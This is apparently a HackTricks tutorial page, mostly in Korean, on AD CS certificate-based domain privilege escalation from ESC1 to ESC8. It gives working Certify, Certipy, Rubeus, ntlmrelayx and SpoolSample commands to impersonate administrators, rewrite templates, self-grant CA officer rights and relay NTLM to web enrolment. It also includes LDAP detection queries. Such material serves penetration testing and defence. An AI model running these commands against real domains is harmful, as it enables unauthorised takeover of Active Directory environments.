# AD CS 도메인 권한 상승

{{#include ../../../banners/hacktricks-training.md}}


**다음 게시물들의 권한 상승 기술 섹션을 요약한 내용입니다:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## 잘못 구성된 인증서 템플릿 - ESC1

### 설명

### Misconfigured Certificate Templates - ESC1 설명

- **Enterprise CA가 저권한 사용자에게 등록 권한(enrolment rights)을 부여함.**
- **관리자 승인이 필요하지 않음.**
- **권한 있는 담당자의 서명이 필요하지 않음.**
- **인증서 템플릿의 보안 디스크립터가 지나치게 관대하여 저권한 사용자가 등록 권한을 얻을 수 있음.**
- **인증서 템플릿이 인증을 용이하게 하는 EKU를 정의하도록 구성되어 있음:**
- Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0) 또는 EKU 없음(SubCA) 같은 Extended Key Usage (EKU) 식별자가 포함될 수 있음.
- **요청자가 Certificate Signing Request (CSR)에 subjectAltName을 포함할 수 있도록 템플릿이 허용함:**
- Active Directory (AD)는 인증서에 subjectAltName (SAN)이 있으면 이를 신원 확인에 우선 사용함. 즉, CSR에서 SAN을 지정하면 도메인 관리자 같은 어떤 사용자로도 위임(impersonate)할 수 있는 인증서를 요청할 수 있다. 요청자가 SAN을 지정할 수 있는지는 인증서 템플릿의 AD 객체에 있는 `mspki-certificate-name-flag` 속성으로 표시된다. 이 속성은 비트마스크이며, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 플래그가 있으면 요청자가 SAN을 지정할 수 있다.

> [!CAUTION]
> 위 구성은 저권한 사용자가 원하는 아무 SAN으로든 인증서를 요청할 수 있게 하여 Kerberos 또는 SChannel을 통해 어떤 도메인 주체로도 인증할 수 있게 한다.

이 기능은 제품이나 배포 서비스가 HTTPS 또는 호스트 인증서를 즉석에서 생성해야 할 때나 잘못된 이해로 인해 가끔 활성화된다.

이 옵션으로 인증서를 생성하면 경고가 발생하는데, 이미 존재하는 인증서 템플릿(예: `WebServer` 템플릿은 `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`가 활성화되어 있음)을 복제하여 인증용 OID를 포함하도록 수정하는 경우에는 경고가 발생하지 않는다는 점에 유의하라.

### Abuse

취약한 인증서 템플릿을 **찾으려면** 다음을 실행할 수 있다:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
이 취약점을 **악용하여 관리자 권한을 사칭하려면** 다음을 실행할 수 있습니다:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
그런 다음 생성된 **인증서를 `.pfx` 형식으로 변환**하고 이를 사용해 **Rubeus 또는 certipy로 다시 인증**할 수 있습니다:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows 바이너리 "Certreq.exe" & "Certutil.exe"는 PFX를 생성하는 데 사용할 수 있습니다: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest의 구성 스키마 내의 인증서 템플릿을 열거하는 작업(특히 승인이나 서명이 필요하지 않고, Client Authentication 또는 Smart Card Logon EKU를 가지며, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 플래그가 활성화된 것)은 다음 LDAP 쿼리를 실행하여 수행할 수 있습니다:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## 잘못 구성된 인증서 템플릿 - ESC2

### 설명

두 번째 남용 시나리오는 첫 번째 경우의 변형입니다:

1. Enterprise CA가 낮은 권한의 사용자에게 등록 권한을 부여합니다.
2. 관리자 승인 요구가 비활성화되어 있습니다.
3. 권한 있는 서명의 필요성이 생략되어 있습니다.
4. 인증서 템플릿에 대한 과도하게 관대한 보안 디스크립터가 낮은 권한의 사용자에게 인증서 등록 권한을 부여합니다.
5. **인증서 템플릿이 Any Purpose EKU를 포함하도록 정의되었거나 EKU가 없습니다.**

**Any Purpose EKU**는 공격자가 클라이언트 인증, 서버 인증, 코드 서명 등과 같은 모든 목적으로 인증서를 획득할 수 있도록 허용합니다. ESC3에 사용된 동일한 기법을 이 시나리오를 악용하는 데 사용할 수 있습니다.

**EKU가 없는 인증서**는 하위 CA 인증서로 동작하며 모든 목적에 대해 악용될 수 있고 **새 인증서 서명에도 사용할 수 있습니다**. 따라서 공격자는 하위 CA 인증서를 이용해 새 인증서에 임의의 EKU나 필드를 지정할 수 있습니다.

단, 하위 CA가 기본 설정인 **`NTAuthCertificates`** 객체에 의해 신뢰되지 않는 경우 도메인 인증을 위해 생성된 새 인증서는 작동하지 않습니다. 그럼에도 불구하고 공격자는 여전히 **임의의 EKU를 가진 새 인증서**와 임의의 인증서 값을 생성할 수 있습니다. 이는 잠재적으로 광범위한 목적(예: 코드 서명, 서버 인증 등)으로 **악용될 수 있으며**, SAML, AD FS 또는 IPSec과 같은 네트워크 내 다른 애플리케이션에 중대한 영향을 미칠 수 있습니다.

AD Forest의 구성 스키마 내에서 이 시나리오와 일치하는 템플릿을 열거하려면 다음 LDAP 쿼리를 실행할 수 있습니다:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## 잘못 구성된 Enrolment Agent Templates - ESC3

### 설명

이 시나리오는 첫 번째와 두 번째 시나리오와 유사하지만 **다른 EKU** (Certificate Request Agent)를 **악용**하고 **서로 다른 2개의 템플릿**을 사용합니다(따라서 요구사항이 2세트입니다).

The **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), known as **Enrollment Agent** in Microsoft documentation, allows a principal to **enroll** for a **certificate** on **behalf of another user**.

The **“enrollment agent”** enrolls in such a **template** and uses the resulting **certificate to co-sign a CSR on behalf of the other user**. It then **sends** the **co-signed CSR** to the CA, enrolling in a **template** that **permits “enroll on behalf of”**, and the CA responds with a **certificate belong to the “other” user**.

**Requirements 1:**

- Enterprise CA가 낮은 권한의 사용자에게 enrollment 권한을 부여한다.
- manager approval 요구사항이 생략되어 있다.
- authorized signatures에 대한 요구사항이 없다.
- certificate template의 security descriptor가 지나치게 관대하여 낮은 권한의 사용자에게 enrollment 권한을 부여한다.
- certificate template에 Certificate Request Agent EKU가 포함되어 있어 다른 주체를 대신하여 다른 certificate 템플릿을 요청할 수 있게 한다.

**Requirements 2:**

- Enterprise CA가 낮은 권한의 사용자에게 enrollment 권한을 부여한다.
- Manager approval이 우회된다.
- 템플릿의 스키마 버전이 1이거나 2를 초과하며, Certificate Request Agent EKU를 필요로 하는 Application Policy Issuance Requirement를 지정한다.
- certificate template에 정의된 EKU 중 하나가 domain authentication을 허용한다.
- enrollment agent에 대한 제한이 CA에 적용되지 않는다.

### 악용

You can use [**Certify**](https://github.com/GhostPack/Certify) or [**Certipy**](https://github.com/ly4k/Certipy) to abuse this scenario:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
The **users** who are allowed to **obtain** an **enrollment agent certificate**, the templates in which enrollment **agents** are permitted to enroll, and the **accounts** on behalf of which the enrollment agent may act can be constrained by enterprise CAs. This is achieved by opening the `certsrc.msc` **snap-in**, **right-clicking on the CA**, **clicking Properties**, and then **navigating** to the “Enrollment Agents” tab.

However, it is noted that the **default** setting for CAs is to “**Do not restrict enrollment agents**.” When the restriction on enrollment agents is enabled by administrators, setting it to “Restrict enrollment agents,” the default configuration remains extremely permissive. It allows **Everyone** access to enroll in all templates as anyone.

## 취약한 Certificate Template 액세스 제어 - ESC4

### **설명**

**certificate templates**의 **security descriptor**는 특정 **AD principals**가 템플릿과 관련하여 어떤 **permissions**을 가지는지를 정의한다.

만약 **attacker**가 템플릿을 **alter**하고 이전 섹션들에서 설명한 어떤 **exploitable misconfigurations**를 **institute**할 수 있는 권한을 갖고 있다면, **privilege escalation**이 촉진될 수 있다.

certificate template에 적용될 수 있는 주목할 만한 permissions는 다음과 같다:

- **Owner:** 객체에 대한 암묵적인 제어를 부여하며, 모든 속성의 수정을 허용한다.
- **FullControl:** 객체에 대한 완전한 권한을 부여하며, 모든 속성을 변경할 수 있다.
- **WriteOwner:** 객체의 소유자를 attacker가 제어하는 주체로 변경할 수 있다.
- **WriteDacl:** 접근 제어를 조정할 수 있어 attacker에게 FullControl을 부여할 수 있다.
- **WriteProperty:** 객체의 모든 속성을 편집할 수 있다.

### **악용**

템플릿 및 기타 PKI 객체에 대해 편집 권한을 가진 주체를 식별하려면, Certify로 열거한다:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
이전 것과 유사한 privesc 예시:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4는 사용자가 인증서 템플릿에 대한 쓰기 권한을 가진 경우를 말한다. 예를 들어, 이를 악용해 인증서 템플릿의 구성을 덮어써 템플릿을 ESC1에 취약하도록 만들 수 있다.

위 경로에서 볼 수 있듯이, 오직 `JOHNPC`만 이러한 권한을 가지고 있지만, 우리 사용자 `JOHN`은 `JOHNPC`로 향하는 새로운 `AddKeyCredentialLink` 엣지를 가지고 있다. 이 기법은 인증서와 관련되어 있으므로, 저는 이 공격을 [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)로도 구현했다. 다음은 피해자의 NT hash를 가져오기 위한 Certipy’s `shadow auto` 명령의 간단한 미리보기이다.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy**는 단일 명령으로 인증서 템플릿의 구성을 덮어쓸 수 있습니다. **기본적으로**, Certipy는 구성을 **덮어써서** **ESC1에 취약하게 만듭니다**. 또한 **`-save-old` 파라미터로 이전 구성을 저장하도록 지정할 수 있으며**, 이는 공격 후 구성 **복원**에 유용합니다.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Vulnerable PKI Object Access Control - ESC5

### 설명

certificate templates와 certificate authority를 넘어서는 여러 객체를 포함하는 상호 연결된 ACL 기반 관계의 광범위한 네트워크는 전체 AD CS 시스템의 보안에 영향을 미칠 수 있습니다. 보안에 중대한 영향을 줄 수 있는 이러한 객체에는 다음이 포함됩니다:

- CA 서버의 AD 컴퓨터 객체(예: S4U2Self 또는 S4U2Proxy와 같은 메커니즘을 통해 손상될 수 있음).
- CA 서버의 RPC/DCOM 서버.
- 특정 컨테이너 경로 `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` 내의 모든 하위 AD 객체 또는 컨테이너. 이 경로에는 Certificate Templates container, Certification Authorities container, NTAuthCertificates object, Enrollment Services Container 등(여기에 국한되지 않음)의 컨테이너 및 객체가 포함됩니다.

낮은 권한의 공격자가 이러한 중요한 구성 요소 중 하나라도 제어하게 되면 PKI 시스템의 보안이 손상될 수 있습니다.

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### 설명

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage)에서 다룬 내용은 Microsoft가 설명한 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 플래그의 의미도 포함합니다. 이 구성은 Certification Authority (CA)에 활성화되면 Active Directory®에서 생성된 요청을 포함하여 **모든 요청**에 대해 **사용자 정의 값**을 **subject alternative name**에 포함시키는 것을 허용합니다. 결과적으로 이 설정은 표준 User template처럼 권한 없는 사용자 등록에 열려 있는 도메인 **authentication** 용도로 설정된 **any template**을 통해 **침입자**가 등록할 수 있게 합니다. 그 결과 인증서를 확보하여 침입자가 도메인 관리자나 도메인 내의 **any other active entity**로 인증할 수 있게 됩니다.

**참고**: `certreq.exe`에서 `-attrib "SAN:"` 인수를 통해 Certificate Signing Request (CSR)에 alternative names를 추가하는 방식(“Name Value Pairs”라고 불림)은 ESC1에서의 SANs 악용 전략과 차이를 보입니다. 여기서 구분되는 점은 계정 정보가 확장(extension) 대신 인증서 attribute 내에 캡슐화된다는 것입니다.

### 악용

이 설정이 활성화되어 있는지 확인하려면 조직에서는 `certutil.exe`를 사용하여 다음 명령을 실행할 수 있습니다:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
이 작업은 본질적으로 **remote registry access**를 사용하므로, 대안적인 방법은 다음과 같을 수 있다:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
[**Certify**](https://github.com/GhostPack/Certify)와 [**Certipy**](https://github.com/ly4k/Certipy) 같은 도구들은 이 잘못된 구성을 감지하고 악용할 수 있습니다:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
이 설정을 변경하려면, 사용자가 **도메인 관리자** 권한 또는 이에 상응하는 권한을 보유하고 있다고 가정할 때, 다음 명령을 어떤 워크스테이션에서든 실행할 수 있습니다:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
환경에서 이 구성을 비활성화하려면, flag를 다음과 같이 제거할 수 있습니다:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> 2022년 5월 보안 업데이트 이후, 새로 발급된 **certificates**에는 요청자의 `objectSid` 속성을 포함하는 **security extension**이 포함됩니다. For ESC1, 이 SID는 지정된 SAN에서 파생됩니다. 그러나 **ESC6**의 경우, SID는 SAN이 아니라 요청자의 `objectSid`를 반영합니다.\
> **ESC6**를 악용하려면 시스템이 **ESC10 (Weak Certificate Mappings)**에 취약해야 하며, 이는 **SAN을 새로운 security extension보다 우선시**합니다.

## 취약한 Certificate Authority 액세스 제어 - ESC7

### 공격 1

#### 설명

인증 기관(CA)에 대한 액세스 제어는 CA 작업을 관리하는 일련의 권한으로 유지됩니다. 이 권한은 `certsrv.msc`를 실행한 다음 CA에서 오른쪽 클릭하여 Properties를 선택하고 Security 탭으로 이동하면 확인할 수 있습니다. 또한 PSPKI 모듈을 사용하여 다음과 같은 명령으로 권한을 열거할 수 있습니다:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
이는 주요 권한인 **`ManageCA`** 및 **`ManageCertificates`**(각각 “CA 관리자” 및 “인증서 관리자” 역할에 해당)에 대한 통찰을 제공합니다.

#### 악용

인증 기관에 대한 **`ManageCA`** 권한을 보유하면 해당 주체는 PSPKI를 사용하여 원격으로 설정을 조작할 수 있습니다. 여기에는 모든 템플릿에서 SAN을 지정하도록 허용하는 **`EDITF_ATTRIBUTESUBJECTALTNAME2`** 플래그를 전환하는 것이 포함되며, 이는 도메인 권한 상승의 중요한 요소입니다.

이 과정은 PSPKI의 **Enable-PolicyModuleFlag** cmdlet을 사용하여 단순화할 수 있으며, 이를 통해 GUI와 직접 상호작용하지 않고도 수정할 수 있습니다.

**`ManageCertificates`** 권한을 보유하면 대기 중인 요청을 승인할 수 있어 "CA certificate manager approval" 보호 장치를 사실상 우회할 수 있습니다.

**Certify**와 **PSPKI** 모듈의 조합을 사용하여 인증서를 요청, 승인 및 다운로드할 수 있습니다:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### 공격 2

#### 설명

> [!WARNING]
> 이전 공격에서 **`Manage CA`** 권한을 사용하여 **EDITF_ATTRIBUTESUBJECTALTNAME2** 플래그를 활성화해 **ESC6 attack**을 수행했지만, CA 서비스(`CertSvc`)를 재시작하기 전까지는 아무런 효과가 없습니다. `Manage CA` 접근 권한이 있는 사용자는 서비스를 **재시작할 수 있습니다**. 그러나 이것이 사용자가 **원격으로 서비스를 재시작할 수 있다**는 의미는 아닙니다. Furthermore, E**SC6 might not work out of the box** in most patched environments due to the May 2022 security updates.

따라서, 여기에서는 다른 공격 방법을 제시합니다.

Perquisites:

- 오직 **`ManageCA` 권한**
- **`Manage Certificates`** 권한 (**`ManageCA`**에서 부여 가능)
- 인증서 템플릿 **`SubCA`**는 **활성화되어야 합니다** (**`ManageCA`**에서 활성화 가능)

이 기술은 `Manage CA` _및_ `Manage Certificates` 접근 권한을 가진 사용자가 **실패한 인증서 요청을 발급할 수 있다**는 사실에 기반합니다. 인증서 템플릿 **`SubCA`**는 **ESC1에 취약**하지만, **관리자만** 템플릿에 등록할 수 있습니다. 따라서, **사용자**는 **`SubCA`**에 등록을 **요청**할 수 있으며 - 이 요청은 **거부**되지만 - **그 후 매니저가 발급합니다**.

#### 악용

새로운 officer로 자신의 사용자를 추가하여 **자신에게 `Manage Certificates` 접근 권한을 부여할 수 있습니다**.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** 템플릿은 `-enable-template` 매개변수를 사용하여 **CA에서 활성화할 수 있습니다**. 기본적으로 `SubCA` 템플릿은 활성화되어 있습니다.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
이 공격에 대한 전제 조건을 충족했다면, **`SubCA` 템플릿을 기반으로 인증서를 요청하는 것**부터 시작할 수 있습니다.

**이 요청은 거부될 것입니다**, 하지만 우리는 private key를 저장하고 request ID를 기록해 둡니다.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
우리에게 **`Manage CA` 및 `Manage Certificates`** 권한이 있으면, `ca` 명령과 `-issue-request <request ID>` 매개변수를 사용하여 **실패한 인증서 발급** 요청을 처리할 수 있습니다.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
마지막으로, 우리는 `req` 명령과 `-retrieve <request ID>` 매개변수를 사용해 **발급된 인증서를 검색할 수 있습니다**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### 공격 3 – Manage Certificates Extension Abuse (SetExtension)

#### 설명

고전적인 ESC7 남용(EDITF 속성 활성화 또는 보류 중인 요청 승인) 외에도, **Certify 2.0**은 Enterprise CA에서 *Manage Certificates* (a.k.a. **Certificate Manager / Officer**) 역할만 있으면 사용할 수 있는 새로운 프리미티브를 공개했습니다.

`ICertAdmin::SetExtension` RPC 메서드는 *Manage Certificates* 권한을 가진 어떤 주체라도 실행할 수 있습니다. 이 메서드는 전통적으로 합법적인 CA가 **보류 중인** 요청의 확장(extension)을 업데이트하기 위해 사용되었지만, 공격자는 이를 남용해 승인 대기 중인 요청에 *기본값이 아닌* 인증서 확장(예: 사용자 정의 *Certificate Issuance Policy* OID인 `1.1.1.1`)을 추가할 수 있습니다.

대상 템플릿이 해당 확장에 대해 **기본값을 정의하지 않기 때문에**, 요청이 결국 발급될 때 CA는 공격자가 설정한 값을 덮어쓰지 않습니다. 결과적으로 발급된 인증서에는 공격자가 선택한 확장이 포함되어 있으며, 이는 다음과 같은 영향을 줄 수 있습니다.

* 다른 취약한 템플릿의 Application / Issuance Policy 요구사항을 충족시켜 권한 상승으로 이어질 수 있습니다.
* 추가 EKU 또는 정책을 주입하여 제3자 시스템에서 인증서가 예상치 못한 신뢰를 얻도록 할 수 있습니다.

요약하면, 이전에 “덜 강력한” ESC7의 절반으로 간주되던 *Manage Certificates* 권한은 이제 CA 구성에 손대거나 더 엄격한 *Manage CA* 권한을 요구하지 않고도 전체 권한 상승이나 장기 지속성 확보에 활용될 수 있습니다.

#### Certify 2.0으로 프리미티브 남용하기

1. **보류 상태로 남을 인증서 요청을 제출**합니다. 이는 매니저 승인이 필요한 템플릿을 사용해 강제할 수 있습니다:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. 새로운 `manage-ca` 명령으로 보류 중인 요청에 사용자 정의 확장을 추가합니다:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*템플릿이 이미 *Certificate Issuance Policies* 확장을 정의하지 않는다면, 위 값은 발급 후에도 보존됩니다.*

3. 요청을 **발급**합니다(당신의 역할이 *Manage Certificates* 승인 권한도 가지고 있는 경우) 또는 운영자가 승인할 때까지 기다립니다. 발급되면 인증서를 다운로드합니다:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. 결과 인증서는 이제 악의적인 issuance-policy OID를 포함하며 이후 공격(예: ESC13, 도메인 권한 상승 등)에 사용될 수 있습니다.

> NOTE: 동일한 공격은 Certipy ≥ 4.7의 `ca` 명령과 `-set-extension` 파라미터를 통해서도 실행할 수 있습니다.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### 설명

> [!TIP]
> **AD CS가 설치된** 환경에서 **웹 enrollment endpoint가 취약**하고 적어도 하나의 **certificate template이 게시되어 있으며** 그 템플릿이 **도메인 컴퓨터 등록과 client authentication을 허용**한다면(예: 기본 **`Machine`** 템플릿), **spooler 서비스가 활성화된 어떤 컴퓨터든 공격자에 의해 탈취될 수 있습니다!**

AD CS는 관리자가 설치할 수 있는 추가 서버 역할을 통해 여러 **HTTP 기반 enrollment 방법**을 제공합니다. 이러한 HTTP 기반 인증서 등록 인터페이스들은 **NTLM relay 공격**에 취약합니다. 공격자는 **탈취된 머신에서**, 수신 NTLM으로 인증하는 아무 AD 계정으로도 가장할 수 있습니다. 피해자 계정으로 가장하는 동안, 공격자는 이러한 웹 인터페이스에 접근하여 **`User` 또는 `Machine` certificate template**을 사용해 클라이언트 인증용 인증서를 요청할 수 있습니다.

- **web enrollment interface**(구형 ASP 애플리케이션, `http://<caserver>/certsrv/`에 위치)는 기본적으로 HTTP만 사용하므로 NTLM relay 공격에 대한 보호가 없습니다. 또한 Authorization HTTP 헤더를 통해 명시적으로 NTLM 인증만 허용하므로 Kerberos 같은 더 안전한 인증 방식은 적용되지 않습니다.
- **Certificate Enrollment Service**(CES), **Certificate Enrollment Policy**(CEP) Web Service, 및 **Network Device Enrollment Service**(NDES)는 기본적으로 Authorization HTTP 헤더를 통해 negotiate 인증을 지원합니다. Negotiate 인증은 Kerberos와 **NTLM 둘 다** 지원하므로 공격자가 relay 공격 중에 **NTLM으로 다운그레이드**할 수 있습니다. 이 웹 서비스들은 기본적으로 HTTPS를 활성화하지만, HTTPS만으로는 NTLM relay 공격으로부터 **보호되지 않습니다**. HTTPS 서비스에 대한 NTLM relay 방어는 채널 바인딩과 결합된 HTTPS에서만 가능합니다. 안타깝게도 AD CS는 IIS에서 채널 바인딩에 필요한 Extended Protection for Authentication을 활성화하지 않습니다.

NTLM relay 공격의 일반적인 문제는 NTLM 세션의 **짧은 지속 시간**과 공격자가 **NTLM signing을 요구하는 서비스와 상호작용할 수 없음**입니다.

그럼에도 불구하고, NTLM relay 공격으로 사용자 인증서를 획득하면 이 제한은 극복됩니다. 인증서의 유효 기간이 세션 지속 시간을 결정하고, 해당 인증서는 **NTLM signing을 요구하는 서비스**에서도 사용할 수 있기 때문입니다. 탈취한 인증서 활용 방법은 다음을 참조하세요:


{{#ref}}
account-persistence.md
{{#endref}}

NTLM relay 공격의 또 다른 제약은 **공격자 제어 머신이 피해자 계정으로부터 인증을 받아야 한다**는 점입니다. 공격자는 기다리거나 이 인증을 **강제**하려고 시도할 수 있습니다:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Abuse**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` enumerates **enabled HTTP AD CS endpoints**:
```
Certify.exe cas
```
<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

`msPKI-Enrollment-Servers` 속성은 엔터프라이즈 Certificate Authorities (CAs)가 Certificate Enrollment Service (CES) 엔드포인트를 저장하는 데 사용됩니다. 이러한 엔드포인트는 도구 **Certutil.exe**를 사용하여 파싱하고 나열할 수 있습니다:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>
```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Certify를 이용한 악용
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### [Certipy](https://github.com/ly4k/Certipy)를 이용한 악용

인증서 요청은 기본적으로 Certipy가 `Machine` 또는 `User` 템플릿을 기반으로 수행되며, 이는 중계되는 계정 이름이 `$`로 끝나는지 여부에 따라 결정됩니다. 다른 템플릿은 `-template` 매개변수를 사용하여 지정할 수 있습니다.

